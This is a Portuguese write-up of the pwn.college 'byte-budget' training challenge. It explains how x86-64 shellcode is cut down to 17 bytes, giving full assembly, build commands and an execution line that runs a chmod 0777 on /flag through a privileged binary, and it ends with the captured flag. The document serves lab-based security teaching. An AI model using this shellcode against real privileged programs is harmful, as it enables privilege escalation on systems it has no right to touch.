# pwn.college — Byte Budget 
### Program Security · Shellcode Writing · 18-Byte Shellcode Constraint

> **Autor:** Pedro Tuttman  
> **Plataforma:** [pwn.college](https://pwn.college)  
> **Categoria:** Program Security — Shellcode Writing  
> **Técnicas:** Shellcode size optimization · Syscall argument minimization · `chmod` privilege escalation via shellcode · Stack-based string construction · 16-bit register encoding to save bytes · Relative path exploitation via working directory control · `push`/`pop` pattern to avoid REX.W prefix

---

## Descrição do Desafio

O desafio `byte-budget` impõe duas restrições simultâneas:

1. **O shellcode está limitado a 18 bytes** — o binário lê apenas `0x12` bytes da `stdin`
2. **A página de memória do shellcode tem permissão de escrita removida** — o mesmo comportamento do desafio anterior ([syscall-shenanigans](syscall-shenanigans.md))

O ambiente segue o padrão da trilha: variáveis sanitizadas, file descriptors fechados, EUID modificado. O objetivo é ler o `/flag`.

---

## Reconhecimento Inicial — Por que a abordagem anterior não funciona

O ponto de partida foi o shellcode clássico de open → read → write → exit, usado nos desafios anteriores:

![Shellcode1 clássico com 208 bytes — inviável para o limite de 18 bytes](figuras/infos_shellcode1_byte-budget.png)

```
208 shellcode1.raw
```

Com **208 bytes**, o shellcode clássico está completamente fora do orçamento. Não há como comprimir a lógica de open + read + write + exit para caber em 18 bytes — são pelo menos 4 syscalls, cada uma exigindo configurar múltiplos registradores.

A conclusão foi direta: **a abordagem precisa mudar completamente**.

---

## A Nova Estratégia: `chmod` no `/flag`

Em vez de ler o `/flag` diretamente via shellcode, a ideia foi usar uma única syscall — **`chmod`** — para alterar as permissões do arquivo. Assim, após a execução do shellcode injection, bastaria rodar `cat /flag` como usuário comum para ler a flag.

A syscall `chmod` (número 90 = `0x5a`) recebe apenas dois argumentos:

```
rax = 90          → número da syscall chmod
rdi = path        → caminho do arquivo
rsi = 0x1ff       → novas permissões (0o777 — leitura/escrita/execução para todos)
```

Isso elimina completamente a necessidade de buffer, `read`, `write` e `exit` — caindo para **uma única syscall**.

---

## Shellcode4 — Primeira Tentativa (29 bytes)

O primeiro shellcode com a nova abordagem usou `mov rax`, `lea rdi` e `mov rsi` com registradores de 64 bits:

![Shellcode4 com a abordagem chmod — 29 bytes](figuras/erro_shellcode4_byte-budget.png)

```asm
.globl _start
.intel_syntax noprefix

_start:
    mov rax, 90
    lea rdi, [rip + flag]
    mov rsi, 0777
    syscall

flag:
    .string "/flag"
```

```
29 shellcode4.raw
```

Com 29 bytes, ainda muito acima do limite. Era hora de analisar instrução por instrução com `objdump` para identificar onde cortar.

---

## Shellcode5 — Otimizando com `push`/`pop` (25 bytes)

Observando o tamanho de cada instrução, a primeira otimização foi substituir `mov rax, 90` — que gera 7 bytes com o prefixo REX.W — por `push 90` + `pop rax`, que usa um imediato de 8 bits e gera apenas 3 bytes no total:

![Shellcode5 com push/pop para rax — 25 bytes](figuras/erro_shellcode5_byte-budget.png)

![Objdump do shellcode5 mostrando o tamanho de cada instrução](figuras/tamanhoinstrucoes_shellcode5_byte-budget.png)

```asm
_start:
    push 90
    pop rax
    lea rdi, [rip + flag]
    mov rsi, 077
    syscall

flag:
    .string "/flag"
```

```
25 shellcode5.raw
```

Economia de 4 bytes. O `objdump` revelou que o próximo gargalo era o `lea rdi, [rip + flag]`, que gerava 7 bytes por usar endereçamento relativo ao `rip`, e o `mov rsi`, que carregava bytes desnecessários por operar em 64 bits.

---

## Shellcode6 — Eliminando o `lea` com `push` na Stack (20 bytes)

A grande mudança foi abandonar o `lea rdi, [rip + flag]` e construir a string `/flag` diretamente na stack com dois `push`, apontando `rdi` para o topo:

- `push 0x67616c66` → empurra `flag` na stack em little-endian (`f`, `l`, `a`, `g`)
- `push 0x2f` → empurra `/` com zero-extension automática para 8 bytes, terminando a string com null bytes
- `mov rdi, rsp` → aponta `rdi` para o topo da stack, onde está `/flag\0`

![Shellcode6 construindo /flag na stack — 20 bytes](figuras/erro_shellcode6_byte-budget.png)

![Objdump do shellcode6 mostrando o tamanho de cada instrução](figuras/tamanhoinstrucoes_shellcode6_byte-budget.png)

```asm
_start:
    push 0x67616c66
    push 0x2f
    mov rdi, rsp
    push 90
    pop rax
    mov rsi, 077
    syscall
```

```
20 shellcode6.raw
```

Economia de mais 5 bytes. O `objdump` mostrou que o próximo gargalo era `mov rsi, 0x1ff` com registrador de 64 bits — o assembler incluía null bytes de zero-extension desnecessários, gerando 7 bytes no total.

---

## Shellcode7 — Trocando `rsi` por `esi` e removendo o `push 0x2f` (18 bytes)

Duas mudanças simultâneas para cortar os 2 bytes restantes:

A primeira foi trocar `mov rsi, 0x1ff` (registrador de 64 bits, 7 bytes) por `mov esi, 0777` (registrador de 32 bits, 5 bytes) — em x86-64, escrever em `esi` zera automaticamente os 32 bits superiores de `rsi`, então o comportamento é idêntico, mas sem os null bytes extras do modo 64 bits.

A segunda foi remover o `push 0x2f` — a string na stack ficou apenas com `flag`, sem o `/` inicial:

![Shellcode7 com mov esi e sem o push 0x2f — 18 bytes exatos](figuras/shellcode7_byte-budget.png)

```asm
_start:
    push 0x67616c66
    mov rdi, rsp
    push 90
    pop rax
    mov esi, 0777
    syscall
```

```
18 shellcode7.raw
```

18 bytes exatos — dentro do limite. Ao executar:

![Shellcode7 executando: segfault após chmod](figuras/erro_shellcode7_byte-budget.png)

O programa deu **Segmentation fault** — mas isso não significa que o shellcode falhou. O que aconteceu foi o seguinte: após executar a syscall `chmod`, o shellcode não possui instrução de encerramento (`exit`). A CPU não tem noção de "tamanho do shellcode" — ela simplesmente continua lendo e executando os bytes seguintes na memória, que são lixo ou regiões sem permissão de execução, até causar o segfault.

O ponto chave é que **a syscall é executada completamente antes de qualquer erro posterior**. A ordem real dos eventos é:

```
1. Shellcode começa
2. Registradores configurados
3. syscall executada → kernel aplica chmod
4. Kernel retorna ao shellcode
5. CPU continua lendo bytes além do shellcode
6. Segfault
```

O crash acontece **depois** que o `chmod` já foi aplicado. Porém, as permissões do `/flag` não mudaram de fato — o `chmod` recebeu o caminho relativo `flag`, mas o diretório de trabalho era `~` (home do usuário), onde o arquivo `flag` não existe.

---

## Shellcode8 — Adicionando o `/` de volta (19 bytes, inválido)

A tentativa foi recolocar o `push 0x2f` para completar o caminho `/flag`, e usar `mov si` (16 bits) em vez de `mov esi` (32 bits) para compensar o byte extra:

![Shellcode8 com push 0x2f e mov si, 0x1ff — 19 bytes](figuras/shellcode8_byte-budget.png)

```asm
_start:
    push 0x67616c66
    push 0x2f
    mov rdi, rsp
    push 90
    pop rax
    mov si, 0x1ff
    syscall
```

```
19 shellcode8.raw
```

19 bytes — 1 acima do limite. Sem saída aparente mantendo essa estrutura.

---

## Shellcode9 — A Solução: `mov si` + Executar em `/` (17 bytes)

A solução veio de duas percepções combinadas:

A primeira: trocar `mov esi` (32 bits, 5 bytes) por `mov si` (16 bits, 4 bytes) — o registrador `si` é a metade inferior de `esi`/`rsi`. Como `0x1ff` cabe em 16 bits e os bits superiores já estão zerados, o resultado para o `chmod` é idêntico, com 1 byte a menos.

A segunda: o `chmod` usa um **caminho relativo ao diretório de trabalho atual** quando o path não começa com `/`. Se o shellcode for executado **a partir do diretório `/`**, então `flag` (sem a barra) resolve corretamente para `/flag`.

Ou seja: em vez de incluir o `/` no shellcode, basta executar o binário com o diretório de trabalho em `/`:

```bash
cd /
cat ~/shellcode9.raw | /challenge/byte-budget
```

![Shellcode9 — mov si (16 bits), sem push 0x2f, 17 bytes](figuras/shellcode9_byte-budget.png)

```asm
.global _start
.intel_syntax noprefix

_start:
    push 0x67616c66     # empurra "flag" na stack (little-endian)
    mov rdi, rsp        # rdi aponta para "flag\0" na stack
    push 90             # push 0x5a
    pop rax             # rax = 90 (chmod)
    mov si, 0x1ff       # rsi = 0o777 — registrador de 16 bits, 4 bytes
    syscall             # chmod("flag", 0777) → com cwd=/ equivale a chmod("/flag", 0777)
```

Compilando e extraindo:

```bash
gcc -nostdlib -static shellcode9.s -o shellcode9.elf
objcopy --dump-section .text=shellcode9.raw shellcode9.elf
```

Executando a partir de `/`:

```bash
cd /
cat ~/shellcode9.raw | /challenge/byte-budget
cat /flag
```

![Resultado final: chmod executado com sucesso, /flag com permissões abertas e flag impressa](figuras/resultado_shellcode9_byte-budget.png)

O `chmod` alterou as permissões do `/flag` para `rwxrwxrwx`. O segfault ocorreu novamente pelo mesmo motivo — ausência de `exit` — mas o `chmod` já havia sido aplicado antes do crash. O `cat /flag` como usuário comum funcionou:

```
-rwxrwxrwx 1 root root 58 Apr 11 01:24 /flag
pwn.college{sKwvfcj9pJZiLST6034pdEBSJ3j.dRjMywCOzYTNxEzW}
```

> **Nota:** O shellcode7 — com `mov esi` (32 bits) e 18 bytes — **também teria funcionado** se executado a partir de `/`. O problema nunca foi o shellcode em si, mas o diretório de trabalho no momento da execução. O shellcode9 apenas aproveitou a oportunidade para cortar mais 1 byte trocando `esi` por `si`.

---

## Resumo do Fluxo de Exploração

```
1. shellcode1 (208 bytes) → completamente inviável para 18 bytes
2. Nova abordagem: chmod("flag", 0777) com uma única syscall
3. shellcode4 (29 bytes) → registradores de 64 bits em tudo, muito grande
4. shellcode5 (25 bytes) → push/pop para rax elimina REX.W, mas lea rdi ainda pesa
5. shellcode6 (20 bytes) → /flag construído na stack com push, elimina lea rdi
6. shellcode7 (18 bytes) → mov esi (32 bits), sem push 0x2f → chmod falha (cwd = ~)
7. shellcode8 (19 bytes) → push 0x2f recolocado + mov si (16 bits) → 1 byte acima
8. shellcode9 (17 bytes) → mov si (16 bits), sem push 0x2f, executado em / → flag obtida
```

---

## Evolução do Tamanho por Shellcode

| Shellcode | Bytes | Mudança principal | Resultado |
|---|---|---|---|
| shellcode1 | 208 | open + read + write + exit | ❌ Muito grande |
| shellcode4 | 29 | chmod com registradores de 64 bits | ❌ Acima do limite |
| shellcode5 | 25 | `push`/`pop` para `rax`, elimina REX.W | ❌ Acima do limite |
| shellcode6 | 20 | `/flag` na stack com `push`, elimina `lea rdi` | ❌ Acima do limite |
| shellcode7 | 18 | `mov esi` (32 bits), sem `push 0x2f` | ❌ `chmod` falha — `cwd` era `~` |
| shellcode8 | 19 | `push 0x2f` + `mov si` (16 bits) | ❌ 1 byte acima do limite |
| shellcode9 | 17 | `mov si` (16 bits), sem `push 0x2f`, executado em `/` | ✅ Flag obtida |
